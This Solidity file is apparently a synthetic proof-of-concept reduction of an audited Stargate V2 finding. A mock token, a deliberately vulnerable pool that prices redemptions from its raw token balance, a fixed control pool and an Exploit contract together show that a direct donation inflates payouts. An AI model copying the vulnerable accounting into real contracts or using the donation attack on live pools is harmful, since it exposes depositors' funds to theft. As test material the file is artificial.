// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Stargate V2 — Inflation of pool balances (OtterSec, finding 47356)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    _getPoolBalance returns token.balanceOf(address(this)). A direct
    transfer of 1000 inflates that balance from 1000 to 2000. Redeeming
    1000 LP then pays 2000, which is 1000 more than the deposit. The
    control pool keeps an internal balance, so the same gift does not
    change the rate and the redeem pays 1000. The blamed read is
    preserved verbatim (@> VULN). run() does not warp. */

contract MockToken {
    string public name = "Pool Asset";
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        require(balanceOf[from] >= amount, "bal");
        allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract DirectSender {
    function send(address token, address pool, uint256 amount) external {
        MockToken(token).transfer(pool, amount);
    }
}

contract VulnPool {
    address public token;
    uint256 public totalSupply;
    uint256 public accounted;
    mapping(address => uint256) public balanceOf;

    constructor(address token_) {
        token = token_;
    }

    function _getPoolBalance() internal view virtual returns (uint256 balance) {
        // @> VULN: a direct transfer raises balanceOf without a deposit, so this pool balance is inflated.
        balance = IERC20(token).balanceOf(address(this));
    }

    function poolBalance() external view returns (uint256 balance) {
        balance = _getPoolBalance();
    }

    function deposit(uint256 amount, address receiver) external returns (uint256 shares) {
        require(MockToken(token).transferFrom(msg.sender, address(this), amount), "pull");
        shares = amount;
        totalSupply += shares;
        balanceOf[receiver] += shares;
        accounted += amount;
    }

    function redeem(uint256 lpAmount, address receiver) external returns (uint256 paid) {
        require(balanceOf[msg.sender] >= lpAmount, "lp");
        uint256 supply = totalSupply;
        uint256 poolBal = _getPoolBalance();
        paid = lpAmount * poolBal / supply;
        balanceOf[msg.sender] -= lpAmount;
        totalSupply = supply - lpAmount;
        require(MockToken(token).transfer(receiver, paid), "pay");
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract ControlPool {
    address public token;
    uint256 public totalSupply;
    uint256 public accounted;
    mapping(address => uint256) public balanceOf;

    constructor(address token_) {
        token = token_;
    }

    function _getPoolBalance() internal view returns (uint256 balance) {
        balance = accounted;
    }

    function poolBalance() external view returns (uint256 balance) {
        balance = _getPoolBalance();
    }

    function deposit(uint256 amount, address receiver) external returns (uint256 shares) {
        require(MockToken(token).transferFrom(msg.sender, address(this), amount), "pull");
        shares = amount;
        totalSupply += shares;
        balanceOf[receiver] += shares;
        accounted += amount;
    }

    function redeem(uint256 lpAmount, address receiver) external returns (uint256 paid) {
        require(balanceOf[msg.sender] >= lpAmount, "lp");
        uint256 supply = totalSupply;
        uint256 poolBal = _getPoolBalance();
        paid = lpAmount * poolBal / supply;
        balanceOf[msg.sender] -= lpAmount;
        totalSupply = supply - lpAmount;
        accounted -= paid;
        require(MockToken(token).transfer(receiver, paid), "pay");
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 1000 ether;
    uint256 public constant GIFT = 1000 ether;

    MockToken public token; // CREATE nonce 1
    VulnPool public vuln; // CREATE nonce 2
    ControlPool public control; // CREATE nonce 3
    DirectSender public sender; // CREATE nonce 4

    uint256 public inflated;
    uint256 public vulnPaid;
    uint256 public extra;
    uint256 public controlQuoted;
    uint256 public controlPaid;
    uint256 public controlLeft;

    constructor() {
        token = new MockToken();
        vuln = new VulnPool(address(token));
        control = new ControlPool(address(token));
        sender = new DirectSender();
        token.mint(address(this), AMOUNT * 2);
        token.mint(address(sender), GIFT * 2);
    }

    function run() external {
        token.approve(address(vuln), AMOUNT);
        vuln.deposit(AMOUNT, address(this));
        sender.send(address(token), address(vuln), GIFT);

        inflated = vuln.poolBalance();
        require(inflated == AMOUNT + GIFT, "balance not inflated");

        vulnPaid = vuln.redeem(AMOUNT, address(this));
        extra = vulnPaid - AMOUNT;
        require(vulnPaid == AMOUNT + GIFT, "redeem did not pay the gift");
        require(extra == GIFT, "extra credit is not the gift");

        token.approve(address(control), AMOUNT);
        control.deposit(AMOUNT, address(this));
        sender.send(address(token), address(control), GIFT);

        controlQuoted = control.poolBalance();
        require(controlQuoted == AMOUNT, "control balance inflated");

        controlPaid = control.redeem(AMOUNT, address(this));
        controlLeft = token.balanceOf(address(control));
        require(controlPaid == AMOUNT, "control paid the gift");
        require(controlLeft == GIFT, "control did not keep the gift");
    }
}
